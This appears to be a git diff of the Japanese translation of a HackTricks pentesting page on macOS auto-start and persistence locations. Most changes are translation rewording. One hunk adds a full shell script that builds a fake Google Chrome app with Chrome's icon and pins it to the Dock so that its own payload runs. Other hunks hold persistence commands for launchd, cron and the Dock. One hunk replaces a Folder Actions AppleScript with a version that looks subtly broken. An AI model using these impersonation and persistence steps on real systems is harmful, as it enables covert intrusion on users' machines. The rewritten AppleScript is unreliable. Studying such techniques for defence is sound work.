@@ -4,7 +4,7 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 * [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 * [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
@@ -17,7 +17,7 @@
 ## サンドボックス回避
 
 {% hint style="success" %}
-ここでは、**サンドボックス回避**に役立つ起動場所を見つけることができます。これにより、単純に**ファイルに書き込んで待機**するだけで、非常に**一般的なアクション**、決まった**時間**、または通常はルート権限を必要としない**アクション**を実行できます。
+ここでは、**サンドボックス回避**に役立つ起動場所を見つけることができます。これにより、単純に**ファイルに書き込んで待機**し、非常に**一般的なアクション**、決まった**時間**、または通常はルート権限を必要としない**アクション**を実行できます。
 {% endhint %}
 
 ### Launchd
@@ -45,7 +45,7 @@
 
 #### 説明と攻撃手法
 
-**`launchd`**は、OX Sカーネルによって起動時に最初に実行され、シャットダウン時に最後に終了する**最初のプロセス**です。常に**PID 1**を持つべきです。このプロセスは、以下の場所にある**ASEP** **plists**で指定された設定を**読み取り、実行**します。
+**`launchd`**は、OX Sカーネルによって起動時に実行される**最初のプロセス**であり、シャットダウン時に終了する最後のプロセスです。常に**PID 1**を持つべきです。このプロセスは、以下の場所にある**ASEP** **plists**で指定された設定を**読み取り、実行**します。
 
 * `/Library/LaunchAgents`: 管理者によってインストールされたユーザーごとのエージェント
 * `/Library/LaunchDaemons`: 管理者によってインストールされたシステム全体のデーモン
@@ -83,7 +83,7 @@
 新しいデーモンまたはエージェントの設定ファイルは、**次回の再起動後または** `launchctl load <target.plist>`を使用して**ロードされます**。また、拡張子なしの.plistファイルを`launchctl -F <file>`でロードすることも可能です（ただし、これらのplistファイルは自動的に再起動後にロードされません）。
 `launchctl unload <target.plist>`を使用して**アンロード**することも可能です（それによって指定されたプロセスは終了します）。
 
-エージェントまたはデーモンが**実行されるのを妨げる**（オーバーライドなど）**何もないことを確認する**には、次のコマンドを実行します：`sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
+`sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`を実行して、**エージェント**または**デーモン**が**実行されるのを妨げる**（オーバーライドなど）**何もないことを確認**してください。
 {% endhint %}
 
 現在のユーザーによってロードされているすべてのエージェントとデーモンをリストアップします：
@@ -245,7 +245,7 @@ plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 
 QuickLookプラグインは、ファイルのプレビューを**トリガー**すると（Finderでファイルを選択してスペースバーを押す）、そのファイルタイプをサポートする**プラグイン**がインストールされている場合に実行されます。
 
-独自のQuickLookプラグインをコンパイルし、前述の場所のいずれかに配置し、サポートされているファイルに移動してスペースを押すことでトリガーすることが可能です。
+独自のQuickLookプラグインをコンパイルし、前述の場所のいずれかに配置し、サポートされているファイルに移動してスペースを押すことで、プラグインをトリガーすることが可能です。
 
 ### ~~ログイン/ログアウトフック~~
 
@@ -291,24 +291,24 @@ defaults delete com.apple.loginwindow LogoutHook
 ```
 ルートユーザーのスタート位置は**`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**に保存されています。
 
-## 条件付きサンドボックス回避
+## 条件付きサンドボックスバイパス
 
 {% hint style="success" %}
-ここでは、**サンドボックス回避**に役立つスタート位置を見つけることができます。これにより、単純に**ファイルに書き込んで実行する**ことができます。特定の**インストールされたプログラム、"一般的でない"ユーザー**のアクションや環境など、**一般的でない条件**を期待します。
+ここでは、**サンドボックスバイパス**に役立つスタート位置を見つけることができます。これにより、単純に**ファイルに書き込んで実行する**ことができます。特定の**インストールされたプログラム、"一般的でない"ユーザー**のアクションや環境など、**一般的でない条件**を期待します。
 {% endhint %}
 
 ### Cron
 
 **解説**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)
 
-* サンドボックス回避に役立つ: [✅](https://emojipedia.org/check-mark-button)
+* サンドボックスバイパスに役立つ: [✅](https://emojipedia.org/check-mark-button)
 * ただし、`crontab`バイナリを実行できる必要があります
 * または、ルートユーザーである必要があります
 
 #### 位置
 
 * **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
-* 直接書き込みアクセスにはルートが必要です。`crontab <file>`を実行できる場合はルートは不要です。
+* 直接書き込みアクセスにはルートが必要です。`crontab <file>`を実行できる場合はルートは必要ありません。
 * **トリガー**: cronジョブに依存します。
 
 #### 説明と攻撃手法
@@ -319,7 +319,7 @@ crontab -l
 ```
 ユーザーのすべてのcronジョブは、**`/usr/lib/cron/tabs/`**と**`/var/at/tabs/`**（root権限が必要）にあります。
 
-MacOSでは、**特定の頻度**でスクリプトを実行するいくつかのフォルダが見つかります。
+MacOSでは、**特定の頻度**でスクリプトを実行するいくつかのフォルダが次の場所にあります：
 ```bash
 # The one with the cron jobs is /usr/lib/cron/tabs/
 ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
@@ -433,7 +433,7 @@ EOF
 ```
 ### SSHRC
 
-解説: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)
+Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)
 
 * サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
 * ただし、sshが有効になっていて使用されている必要があります
@@ -448,7 +448,7 @@ EOF
 
 #### 説明と攻撃手法
 
-デフォルトでは、`/etc/ssh/sshd_config`の`PermitUserRC no`が設定されていない限り、ユーザーが**SSH経由でログイン**すると、スクリプト**`/etc/ssh/sshrc`**と**`~/.ssh/rc`**が実行されます。
+デフォルトでは、`/etc/ssh/sshd_config`の`PermitUserRC no`がない限り、ユーザーが**SSH経由でログイン**すると、スクリプト**`/etc/ssh/sshrc`**と**`~/.ssh/rc`**が実行されます。
 
 #### 説明
 
@@ -498,7 +498,7 @@ osascript -e 'tell application "System Events" to delete login item "itemname"'
 
 （ログインアイテムに関する前のセクションを確認してください。これは拡張です）
 
-**ZIP**ファイルを**ログインアイテム**として保存すると、**`Archive Utility`**がそれを開きます。たとえば、ZIPが**`~/Library`**に保存され、バックドアを含む**`LaunchAgents/file.plist`**というフォルダが含まれている場合、そのフォルダが作成され（デフォルトでは作成されません）、plistが追加されます。したがって、次回ユーザーが再ログインすると、plistで指定された**バックドアが実行されます**。
+**ZIP**ファイルを**ログインアイテム**として保存すると、**`Archive Utility`**がそれを開きます。たとえば、ZIPが**`~/Library`**に保存され、フォルダ**`LaunchAgents/file.plist`**にバックドアが含まれている場合、そのフォルダが作成され（デフォルトでは作成されません）、plistが追加されます。したがって、次回ユーザーが再ログインすると、plistで指定された**バックドアが実行されます**。
 
 別のオプションとして、ユーザーのホームディレクトリに**`.bash_profile`**と**`.zshenv`**というファイルを作成することもできます。したがって、LaunchAgentsフォルダが既に存在する場合でも、このテクニックは機能します。
 
@@ -506,14 +506,14 @@ osascript -e 'tell application "System Events" to delete login item "itemname"'
 
 解説: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)
 
-#### 位置
+#### 場所
 
 * **`at`**を**実行する**必要があり、**有効化**されている必要があります。
 
 #### **説明**
 
 「atタスク」は、**特定の時間にタスクをスケジュールする**ために使用されます。\
-これらのタスクはcronとは異なり、**一度だけ実行された後に削除される**一時的なタスクです。ただし、システムの再起動後も残るため、潜在的な脅威として排除することはできません。
+これらのタスクはcronと異なり、**一度だけ実行された後に削除される**一時的なタスクです。ただし、システムの再起動後も残るため、潜在的な脅威として排除することはできません。
 
 **デフォルトでは**無効ですが、**root**ユーザーは次のコマンドで**有効化**できます:
 ```bash
@@ -529,7 +529,7 @@ sh-3.2# atq
 26	Tue Apr 27 00:46:00 2021
 22	Wed Apr 28 00:29:00 2021
 ```
-上記では、2つのスケジュールされたジョブが表示されています。`at -c JOBNUMBER`を使用して、ジョブの詳細を出力できます。
+上記では、2つのスケジュールされたジョブが表示されています。`at -c JOBNUMBER`を使用してジョブの詳細を印刷できます。
 ```shell-session
 sh-3.2# at -c 26
 #!/bin/sh
@@ -637,24 +637,11 @@ tell application "Finder"
     if not folderActionsEnabled then
         set folder actions enabled to true
     end if
-    try
-        set currentScripts to scripts folder of folderPath
-        set scriptName to name of scriptPath
-        set scriptExists to false
-        repeat with i from 1 to count of currentScripts
-            if name of item i of currentScripts is scriptName then
-                set scriptExists to true
-                exit repeat
-            end if
-        end repeat
-        if not scriptExists then
-            move scriptPath to scripts folder of folderPath
-        end if
-    end try
+    set folder action scripts folder to folderPath
+    set newScript to make new script file at folderPath with properties {name:"folder", visible:false}
+    set contents of newScript to scriptPath
 end tell
 ```
-
-このスクリプトは、指定したフォルダにフォルダアクションを有効にし、以前にコンパイルされたスクリプトをアタッチします。フォルダアクションは、指定したフォルダ内のファイルやフォルダに対して自動的に実行されるスクリプトです。このスクリプトを実行することで、`/users/username/Desktop`フォルダ内のファイルやフォルダに対して、`folder.scpt`という名前のスクリプトが自動的に実行されるようになります。
 ```javascript
 var se = Application("System Events");
 se.folderActionsEnabled = true;
@@ -682,22 +669,22 @@ app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
 {% endcode %}
 
-次のコマンドでコンパイルします: `osacompile -l JavaScript -o folder.scpt source.js`
+次のコマンドでコンパイルします：`osacompile -l JavaScript -o folder.scpt source.js`
 
-次の場所に移動します:
+次の場所に移動します：
 ```bash
 mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
 mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 ```
-次に、「Folder Actions Setup」アプリを開き、**監視したいフォルダ**を選択し、この場合は**`folder.scpt`**（私の場合はoutput2.scpと呼びました）を選択します。
+次に、「Folder Actions Setup」アプリを開き、**監視したいフォルダ**を選択し、この場合は**`folder.scpt`**を選択します（私の場合はoutput2.scpと呼びました）：
 
 <figure><img src="../.gitbook/assets/image (2).png" alt="" width="297"><figcaption></figcaption></figure>
 
 これで、**Finder**でそのフォルダを開くと、スクリプトが実行されます。
 
-この設定は、**base64形式で保存された**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`に保存されています。
+この設定は、**base64形式で保存された**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`というplistファイルに保存されています。
 
-次に、GUIアクセスなしでこの永続性を準備してみましょう：
+次に、GUIアクセスなしでこの永続化を準備してみましょう：
 
 1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**をバックアップするために`/tmp`にコピーします：
 * `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
@@ -744,7 +731,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.
 
 #### 説明と攻撃手法
 
-ドックに表示されるすべてのアプリケーションは、plist内で指定されています：**`~/Library/Preferences/com.apple.dock.plist`**
+ドックに表示されるすべてのアプリケーションは、plistファイル**`~/Library/Preferences/com.apple.dock.plist`**で指定されています。
 
 次のようにして、**アプリケーションを追加**することができます：
 
@@ -758,29 +745,82 @@ killall Dock
 ```
 {% endcode %}
 
+いくつかの**ソーシャルエンジニアリング**を使用すると、ドック内でGoogle Chromeなどを**なりすまし**、実際に独自のスクリプトを実行することができます。
+```bash
+#!/bin/sh
+
+# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
+
+rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null
+
+# Create App structure
+mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
+mkdir -p /tmp/Google\ Chrome.app/Contents/Resources
+
+# Payload to execute
+echo '#!/bin/sh
+open /Applications/Google\ Chrome.app/ &
+touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
+
+chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
+
+# Info.plist
+cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>CFBundleExecutable</key>
+<string>Google Chrome</string>
+<key>CFBundleIdentifier</key>
+<string>com.google.Chrome</string>
+<key>CFBundleName</key>
+<string>Google Chrome</string>
+<key>CFBundleVersion</key>
+<string>1.0</string>
+<key>CFBundleShortVersionString</key>
+<string>1.0</string>
+<key>CFBundleInfoDictionaryVersion</key>
+<string>6.0</string>
+<key>CFBundlePackageType</key>
+<string>APPL</string>
+<key>CFBundleIconFile</key>
+<string>app</string>
+</dict>
+</plist>
+EOF
+
+# Copy icon from Google Chrome
+cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns
+
+# Add to Dock
+defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
+killall Dock
+```
 ### カラーピッカー
 
 解説: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)
 
-* サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
-* 特定のアクションが必要
-* 別のサンドボックスに入ることになります
+* サンドボックスをバイパスするのに役立つ: [🟠](https://emojipedia.org/large-orange-circle)
+* 非常に具体的なアクションが必要です
+* 別のサンドボックスに入ります
 
 #### 場所
 
 * `/Library/ColorPickers`&#x20;
-* ルート権限が必要
+* ルート権限が必要です
 * トリガー: カラーピッカーを使用する
 * `~/Library/ColorPickers`
 * トリガー: カラーピッカーを使用する
 
 #### 説明とエクスプロイト
 
-コードと一緒にカラーピッカーのバンドルをコンパイルします（たとえば、[**こちらのもの**](https://github.com/viktorstrate/color-picker-plus)を使用できます）。そして、コンストラクタを追加します（[スクリーンセーバーのセクション](macos-auto-start-locations.md#screen-saver)のように）そして、バンドルを`~/Library/ColorPickers`にコピーします。
+コードと一緒にカラーピッカーのバンドルをコンパイルします（たとえば、[**この例**](https://github.com/viktorstrate/color-picker-plus)を使用できます）。そして、コンストラクタを追加します（[スクリーンセーバーセクション](macos-auto-start-locations.md#screen-saver)のように）そして、バンドルを`~/Library/ColorPickers`にコピーします。
 
 その後、カラーピッカーがトリガーされると、あなたのコードも実行されるはずです。
 
-あなたのライブラリをロードするバイナリには、非常に制限の厳しいサンドボックスがあることに注意してください：`/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
+注意してください、あなたのライブラリをロードするバイナリは非常に制限のあるサンドボックスを持っています: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
 
 {% code overflow="wrap" %}
 ```bash
@@ -808,7 +848,7 @@ killall Dock
 
 Finder Sync拡張機能を持つアプリケーションの例は[こちらで見つけることができます](https://github.com/D00MFist/InSync)。
 
-アプリケーションは`Finder Sync Extensions`を持つことができます。この拡張機能は実行されるアプリケーションの内部に配置されます。さらに、拡張機能が自身のコードを実行できるようにするためには、**有効なAppleデベロッパー証明書で署名**されている必要があり、**サンドボックス化**されている必要があります（ただし、緩和された例外が追加される場合もあります）。また、次のようなものに登録されている必要があります:
+アプリケーションは`Finder Sync Extensions`を持つことができます。この拡張機能は実行されるアプリケーションの内部に配置されます。さらに、拡張機能が自身のコードを実行できるようにするためには、**有効なApple開発者証明書で署名**されている必要があり、**サンドボックス化**されている必要があります（ただし、緩和された例外が追加される場合もあります）。また、次のようなものに登録されている必要があります:
 ```bash
 pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
 pluginkit -e use -i com.example.InSync.InSync
@@ -1063,7 +1103,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.
 ```
 MANPAGER /tmp/view
 ```
-次に、`/tmp/view`を以下のように作成します：
+そして、`/tmp/view`を以下のように作成します：
 ```bash
 #!/bin/zsh
 
@@ -1214,7 +1254,7 @@ XQuartzは**もはやmacOSにインストールされていない**ため、詳�
 ### ~~kext~~
 
 {% hint style="danger" %}
-ルートとしてさえkextをインストールするのは非常に複雑なので、サンドボックスからの脱出や持続性のためには考慮しないでください（エクスプロイトがある場合を除く）
+ルートとしてkextをインストールするのは非常に複雑なので、サンドボックスからの脱出や持続性のためには考慮しないでください（エクスプロイトがある場合を除く）
 {% endhint %}
 
 #### 場所
@@ -1222,7 +1262,7 @@ XQuartzは**もはやmacOSにインストールされていない**ため、詳�
 KEXTを起動アイテムとしてインストールするには、次のいずれかの場所に**インストールする必要があります**：
 
 * `/System/Library/Extensions`
-* OS Xオペレーティングシステムに組み込まれたKEXTファイル。
+* OS Xオペレーティングシステムに組み込まれたKEXTファイル
 * `/Library/Extensions`
 * サードパーティのソフトウェアによってインストールされたKEXTファイル
 
